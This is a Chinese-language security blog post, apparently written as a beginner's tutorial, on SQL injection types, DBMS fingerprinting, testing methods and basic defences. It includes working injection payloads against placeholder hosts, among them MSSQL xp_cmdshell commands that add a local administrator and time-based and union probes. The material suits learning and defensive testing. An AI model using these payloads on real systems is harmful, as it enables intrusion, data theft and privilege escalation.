{"title":"SQL注入类型危害及防御","slug":"网安大类/OWASPTOP/SQLInject/SQL注入类型危害及防御","date":"2019-03-28T09:34:30.000Z","updated":"2022-03-29T06:20:31.554Z","url":"2019/3-28-384.html","path":"api/articles/2019/3-28-384.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190328170830.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言简述\"><a href=\"#0x00-前言简述\" class=\"headerlink\" title=\"0x00 前言简述\"></a>0x00 前言简述</h4><p>本文主要以浅谈SQL注入漏洞进行学习总结，帮助新入门安全学习的小白快速入门SQL注入基础；<br>在安全圈里总所周知，注入攻击是一个非常传统的攻击方式, 且SQL注入方式与手段变化多端；在日常漏洞中SQL注入占比约10%在OWASP Top榜单曾一度位居第一,虽不算高占比但其危害极大,业内企业因此蒙受损失的新闻层出不穷。</p>\n<p><em>Q: SQL注入的定义?</em></p>\n<blockquote>\n<p>答: SQL Injection 是这样的一种漏洞应用程序向后台数据库传递<code>SQL(Structured Query Language-结构化的查询语言)</code>时候，如果攻击者提供了影响该查询的能力便会引发SQL注入安全问题;<br>简单的说就是攻击者通过影响传递给数据库的内容来修改SQL自身的语法和功能，并且会影响SQL所支持的数据库和操作系统的功能和灵活性;</p>\n</blockquote>\n<p><br></p>\n<p><em>SQL注入漏洞原理:</em><br>描述:脚本攻击主要是针对动态网站进行的攻击,其原因是在建立动态网页的过程中没有对用户的输入输出进行有效的合法性验证,使应用程序存在安全隐患。用户可以提交一段数据库查询代码, 根据程序返回的结果,获得某些他想得知的数据或进行数据库操作；</p>\n<h4 id=\"0x00-的危害与防御\"><a href=\"#0x00-的危害与防御\" class=\"headerlink\" title=\"0x00 的危害与防御\"></a>0x00 的危害与防御</h4><p><strong>SQL注入漏洞危害：</strong><br>例如数据库被拖库,管理员和重要人员信息泄露,甚至还能通过SQL注入漏洞直接获取webshell或者执行命令导致服务器系统权限被获取等等。<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190328170830.png\" alt=\"WeiyiGeek.SQL注入漏洞危害\" title=\"\" class=\"\">\n                <p>WeiyiGeek.SQL注入漏洞危害</p>\n            </figure></p>\n<h4 id=\"0x01-SQL注入漏洞的分类\"><a href=\"#0x01-SQL注入漏洞的分类\" class=\"headerlink\" title=\"0x01 SQL注入漏洞的分类\"></a>0x01 SQL注入漏洞的分类</h4><h5 id=\"1-按照SQL注入利用方式分类\"><a href=\"#1-按照SQL注入利用方式分类\" class=\"headerlink\" title=\"(1) 按照SQL注入利用方式分类\"></a>(1) 按照SQL注入利用方式分类</h5><ul>\n<li>盲注 </li>\n<li>Error 报错注入</li>\n<li>Time 时间盲住</li>\n<li>Union 注入</li>\n<li>内联查询注入</li>\n<li>拼接（堆）查询注入</li>\n</ul>\n<p><em>Q：目前所掌握的注入漏洞种类,出现频率较高有哪些？</em><br>比如：盲注,time 时间盲注,报错注入,union注入（在不影响正常服务的情况下,拼接查询算最高危害的,接下来就是union）；</p>\n<p><em>Q：比较易被检测出来的有哪些？</em><br>     比如：盲注,time 时间盲注,报错注入等；</p>\n<p><em>Q：关于注入的位置常常有那些？</em><br>常发生于用户和服务交互处（增删改查操作）,AJAX,API接口等等,用这个检测报错注入,比较方便。</p>\n<h5 id=\"2-按照攻击入口分类\"><a href=\"#2-按照攻击入口分类\" class=\"headerlink\" title=\"(2) 按照攻击入口分类\"></a>(2) 按照攻击入口分类</h5><ul>\n<li>GET型的SQL注入</li>\n<li>POST型SQL注入</li>\n<li>Cookie型SQL注入（Cookies中转注入）</li>\n<li>Header型SQL注入</li>\n</ul>\n<h5 id=\"3-按照注入点类型分类\"><a href=\"#3-按照注入点类型分类\" class=\"headerlink\" title=\"(3) 按照注入点类型分类\"></a>(3) 按照注入点类型分类</h5><ol>\n<li><p>整型注入<br>测试方法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://host/test.php?id=100 and 1=1  返回成功</span><br><span class=\"line\">http://host/test.php?id=100 and 1=2  返回失败</span><br><span class=\"line\">产生原因：sqlstr = \"<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> news <span class=\"keyword\">where</span> <span class=\"keyword\">id</span> = <span class=\"string\">\"+request. getParameter(\"</span><span class=\"keyword\">id</span><span class=\"string\">\")</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>字符型注入<br>测试方法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://host/test.php?name=rainman' and '1'='1 返回成功</span><br><span class=\"line\">http://host/test.php?name=rainman' and '1'='2 返回失败</span><br><span class=\"line\">产生原因：sqlstr = \"<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> news <span class=\"keyword\">where</span> <span class=\"keyword\">id</span> = <span class=\"string\">'\"+ request.getParameter(\"name\") + \"'</span><span class=\"string\">\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>搜索型注入<br>测试方法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://host/test.php?keyword=test%' and '%'=' 返回test查询相同结果</span><br><span class=\"line\">http://host/test.php?id=test%' and '%'=' 返回少于test 查询结果的内容</span><br><span class=\"line\">​</span><br><span class=\"line\">产生原因：</span><br><span class=\"line\">sqlstr = \"<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> news <span class=\"keyword\">where</span> keywordlike <span class=\"string\">'%\" + request. getParameter(\"keyword\")+ \"%'</span><span class=\"string\">\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>盲注型注入</p>\n</li>\n</ol>\n<h5 id=\"4-注入方式\"><a href=\"#4-注入方式\" class=\"headerlink\" title=\"(4) 注入方式\"></a>(4) 注入方式</h5><ol>\n<li><p>内联式SQL注入<br>内联注入是指查询注入SQL代码后,原来的查询仍然全部执行；</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sqlstr = \"<span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span> <span class=\"keyword\">where</span> username =<span class=\"string\">'\"+username+\"'</span> <span class=\"keyword\">and</span> <span class=\"keyword\">password</span> = <span class=\"string\">'\"+password+\"'</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">                                                 username = \"</span><span class=\"string\">' or '</span><span class=\"keyword\">test</span><span class=\"string\">'='</span><span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">                                                 password = \"</span><span class=\"string\">' or '</span>pass<span class=\"string\">'='</span><span class=\"string\">\"</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>终止式SQL注入<br>终止式SQL语句注入是指攻击者在注入SQL代码时,通过注释剩下的查询来成功结束该语句,被注释的查询不会被执行;</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username = ‚' or ''='' <span class=\"comment\">--‚</span></span><br><span class=\"line\">password = ‚any string'</span><br><span class=\"line\">​</span><br><span class=\"line\">常见的终止方式</span><br><span class=\"line\">• 终止字符串： <span class=\"comment\">-- , #, %23, %00, /*</span></span><br><span class=\"line\">• 终止方法： <span class=\"comment\">-- , '-- , ')-- , ) -- , ')) --,))--</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ol start=\"3\">\n<li>union 注入<br>Union是数据库管理员经常使用且可以掌控的运算符之一,可以使用它连接两条或多条select语句的查询结果。<br>其基本语法如下：<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">Select</span> colum1,colum2,colum3,…,<span class=\"keyword\">columN</span> <span class=\"keyword\">from</span> table1 <span class=\"keyword\">Union</span> <span class=\"keyword\">Select</span> colum1,colum2,colum3,…,<span class=\"keyword\">columN</span> <span class=\"keyword\">from</span> table2</span><br><span class=\"line\">​</span><br><span class=\"line\">使用<span class=\"keyword\">union</span>获取数据规则：</span><br><span class=\"line\">- 两个查询返回的列数必须相同。</span><br><span class=\"line\">- 两个<span class=\"keyword\">SELECT</span>语句返回的数据库对应的列必须类型相同或兼容（字段类型一致）</span><br><span class=\"line\">- 通常只有终止式注入时,可较快猜解并利用,否则要知道原始的<span class=\"keyword\">SQL</span>语句才能比较方便的利用</span><br></pre></td></tr></table></figure>\n如果应用返回第一个（原始）查询得到的数据,那么通过在第一个查询后注入一个UNION运算符,并添加另一个任意查询,便可读取到数据库用户有权限访问的任何一张表 (主要需要进行测试占位符) 。</li>\n</ol>\n<p>Union语句的构建</p>\n<ul>\n<li>万能列类型：大部分数据库中NULL可兼容任何类型的数据,所有可使用NULL匹配数据表的列类型</li>\n<li>确定列数量：使用union select null,null,null,…,null from dual逐步增加null数量,直到匹配原语句的列数量,成功匹配后返回正常页面<br>  使用order by 确原语句列数量, 可使用折半查找法提高猜测效率</li>\n<li>确定列类型：Union select 1,’2’,null,…,null from dual,先猜测第一列为数字,如果不正确则判断为字符,如果还是不正确则保持null不变（可能为二进制类型）,依次完成部分或全部类型的判断；</li>\n<li>其他:Mysql数字/字符类型可直接转换,可直接使用select 1,2,3,…,n 方式构建union</li>\n</ul>\n<p><strong>Q：Union不适用的地方有那些？</strong><br>A：注入语句无法截断,且不清楚完整的SQL查询语句；Web页面中有两个SQL查询语句,查询语句的列数不同；</p>\n<ol start=\"4\">\n<li>盲注<br>4.1) 基于时间的攻击（delay）<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Mssql    <span class=\"comment\">--#命令执行</span></span><br><span class=\"line\">   http://host/products.asp?id=12;if+(system_user='sa')+exec master..xp_cmdshell'ping localhost'</span><br><span class=\"line\"> Mysql    <span class=\"comment\">--#执行sha1函数1000000次</span></span><br><span class=\"line\">    <span class=\"keyword\">select</span> <span class=\"keyword\">benchmark</span>(<span class=\"number\">1000000</span>, <span class=\"keyword\">sha1</span>(<span class=\"string\">'test'</span>))  </span><br><span class=\"line\"> <span class=\"keyword\">Oracle</span>   <span class=\"comment\">--#请求测试</span></span><br><span class=\"line\">    <span class=\"keyword\">select</span> utl_http.request(<span class=\"string\">'http://10.0.0.1'</span>) <span class=\"keyword\">from</span> dual</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>4.2) 基于boolen注入<br>MSSQL:如果用户属于sysadmin, id = 12/1 返回正常页面,否则返回错误页面 <a href=\"http://host/products.asp?id=12/is_srvrolemember(&#39;sysadmin&#39;)\" target=\"_blank\" rel=\"noopener\">http://host/products.asp?id=12/is_srvrolemember(&#39;sysadmin&#39;)</a><br>• 返回正常页面,判断成立<br>• 返回错误页面,判断失败</p>\n<h5 id=\"5-按报错错误分类数据库注入\"><a href=\"#5-按报错错误分类数据库注入\" class=\"headerlink\" title=\"(5) 按报错错误分类数据库注入\"></a>(5) 按报错错误分类数据库注入</h5><p>要成功的发动SQL注入攻击,最重要的是知道应用正在使用的DBMS,没有这一信息就不可能向查询注入信息并提取自己所感兴趣的数据.<br>原因：不同数据库之间存在语法差异和特性;</p>\n<ol>\n<li>ACCESS Databases + ASP<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注入点：http://xx.xxx.xx.xx/playnews.asp?id=772' and '1=1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> Microsoft OLE DB Provider <span class=\"keyword\">for</span> ODBC Drivers 错误 <span class=\"string\">'80040e14'</span>  [Microsoft][ODBC Microsoft Access Driver] 字符串的语法错误 </span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">查询表达式 <span class=\"string\">'id = 772'</span><span class=\"string\">' 中 /displaynews.asp,行31</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">特有数据表进行判断:</span><br><span class=\"line\">http://host/test.php?id=100 and (select count(*) from sysobjects)&gt;0 and 1=1</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ol start=\"2\">\n<li>MSSQL Databases + ASPX<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--#报错信息：[Microsoft][ODBC SQL ServerDriver][SQL Server] 字符串''之前有未闭合的引号</span></span><br><span class=\"line\"></span><br><span class=\"line\">特有数据表进行判断:</span><br><span class=\"line\">http://host/test.php?id=100 and (<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*) <span class=\"keyword\">from</span> sysobjects)&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span>=<span class=\"number\">1</span></span><br><span class=\"line\">注入点：<span class=\"keyword\">http</span>://www.test.com/showdetail.asp?<span class=\"keyword\">id</span>=<span class=\"number\">49</span><span class=\"string\">' And (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--  </span></span><br><span class=\"line\"><span class=\"string\">执行SQL语句：Select * from 表名 where 字段='</span><span class=\"number\">49</span><span class=\"string\">' And (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES);--</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">字符连接方式判断：</span></span><br><span class=\"line\"><span class=\"string\">http://host/test.php?id=100 and '</span><span class=\"number\">1</span><span class=\"string\">'+'</span><span class=\"number\">1</span><span class=\"string\">'='</span><span class=\"number\">11</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">获取非字符类型错误</span></span><br><span class=\"line\"><span class=\"string\">http://host/products.asp?id=12 and (select top 1 char(94)+(id as varchar(256)) from admin) &gt;0</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">基于时间盲注：</span></span><br><span class=\"line\"><span class=\"string\">http://host/products.asp?id=12;if+(system_user='</span>sa<span class=\"string\">')+waitfor+delay+'</span><span class=\"number\">0</span>:<span class=\"number\">0</span>:<span class=\"number\">5</span><span class=\"string\">'--</span></span><br><span class=\"line\"><span class=\"string\">http://host/products.asp?id=12;if+(system_user='</span>sa<span class=\"string\">')+exec master..xp_cmdshell'</span>ping localhost<span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">关键点：SQL Server内置的存储过程xp_cmdshell ：</span></span><br><span class=\"line\"><span class=\"string\">http://www.test.com/showdetail.asp?id=49'</span>;exec master..xp_cmdshell \"net localgroup administrators name /add\"<span class=\"comment\">--</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ol start=\"3\">\n<li>Mysql + php<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--#报错：Mysql: ERROR 1064 (42000): You have anerror in your SQL syntax; check the manualthat corresponds to your MySQL serverversion for the right syntax to use near</span></span><br><span class=\"line\"></span><br><span class=\"line\">特有数据表进行判断:</span><br><span class=\"line\">http://host/test.php?id=100 and (<span class=\"keyword\">select</span> <span class=\"keyword\">count</span>(*) <span class=\"keyword\">from</span> information_schema.TABLES)&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span>=<span class=\"number\">1</span> mysql&gt; <span class=\"number\">5.0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">字符连接方式判断：</span><br><span class=\"line\"><span class=\"keyword\">http</span>://host/test.php?<span class=\"keyword\">id</span>=<span class=\"number\">100</span> <span class=\"keyword\">and</span> <span class=\"string\">'1'</span>+<span class=\"string\">'1'</span>=<span class=\"string\">'11'</span></span><br><span class=\"line\"><span class=\"keyword\">http</span>://host/test.php?<span class=\"keyword\">id</span>=<span class=\"number\">100</span> <span class=\"keyword\">and</span> <span class=\"keyword\">CONCAT</span>(<span class=\"string\">'1'</span>,<span class=\"string\">'1'</span>)=<span class=\"string\">'11'</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ol start=\"4\">\n<li>Oracle + jsp<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">报错：Oracle: ORA-01756: 括号内的字符串没有正确结束</span></span><br><span class=\"line\">select utl_inaddr.get_host_name((select banner from v$version where rownum= 1)) from dual;</span><br><span class=\"line\"></span><br><span class=\"line\">特有数据表进行判断:</span><br><span class=\"line\">http://host/test.php?id=100 and (select count(*) fromsys.user_tables)&gt;0 and 1=1</span><br><span class=\"line\"></span><br><span class=\"line\">字符连接方式判断：</span><br><span class=\"line\">http://host/test.php?id=100 and '1' || '1'='11'</span><br><span class=\"line\">http://host/test.php?id=100 and CONCAT('1','1')='11'</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h4 id=\"0x03-SQL白盒与黑盒测试方法\"><a href=\"#0x03-SQL白盒与黑盒测试方法\" class=\"headerlink\" title=\"0x03 SQL白盒与黑盒测试方法\"></a>0x03 SQL白盒与黑盒测试方法</h4><ol>\n<li>白盒的测试：<br>1) 快速方式是关键词匹配，找到SQL语句后，看看这些SQL语句在哪被调用，变量的值来自哪里被带入了，是否有安全校验，安全校验是否匹配当前SQL操作的具体场景（字符集编码等也要留意），沿着变量和函数的调用，一直回溯查到输入点就好。</li>\n</ol>\n<p>2) 了解代码使用的框架或者代码结构，看代码对请求进行路由和分发的方式，路由分发方式的设计和实现是否存在隐患，记录一下再看看是否有一些统一的安全filter，记录下他的特性（任何统一的安全filter都会因为不了解后端调用的场景而产生绕过），然后再看看是否有基础的DB库，这个库是否实现了安全的SQL操作。</p>\n<p>3) 了解业务实现的方式，设计的思路，这样黑盒看到同类网站，就可以知道怎么下手知识面越广也越容易发现更多的技巧，了解搭配的数据库版本(MYSQL，MSSQL，Sybase，Oracle，Access)</p>\n<p><br></p>\n<ol start=\"2\">\n<li>黑盒的测试：<br>我觉得查询SELECT型的注入很容易被发现，其实可以多考虑考虑insert update里的注入点发现，关系型数据库里，结合这个接口的功能，提交的返回值对比，response code 5xx ，其实也容易黑盒发现注入点。<br>同时在用户输入处进行测试,表单提交,get/post/request,关注API接口等等请求SQL注入测试。</li>\n</ol>\n<h4 id=\"0x04-SQL监测和防御这类漏洞\"><a href=\"#0x04-SQL监测和防御这类漏洞\" class=\"headerlink\" title=\"0x04 SQL监测和防御这类漏洞\"></a>0x04 SQL监测和防御这类漏洞</h4><p>最好的防御,是内部先发现做策略,开发时过滤特殊字符： 单引号、双引号、斜杠、反斜杠、冒号、 空字符等的字符 ；<br>过滤的对象:   用户的输入 |  提交的URL请求中的参数部分   | 从cookie中得到的数据 ；<br>监测方面目前大多都是日志监控+WAF（统一的filter）,部署防SQL注入系统或脚本 ；<br>数据库日志容易解析,语法出错的、语法读Info表的建立黑白名单机制,都明确是黑客嘛；</p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击, 请勿恶意使用下面描述技术进行非法操作。[TOC]","categories":[{"name":"黑防","path":"api/categories/黑防.json"},{"name":"网站管理","path":"api/categories/网站管理.json"}],"tags":[{"name":"SQL注入","path":"api/tags/SQL注入.json"}]}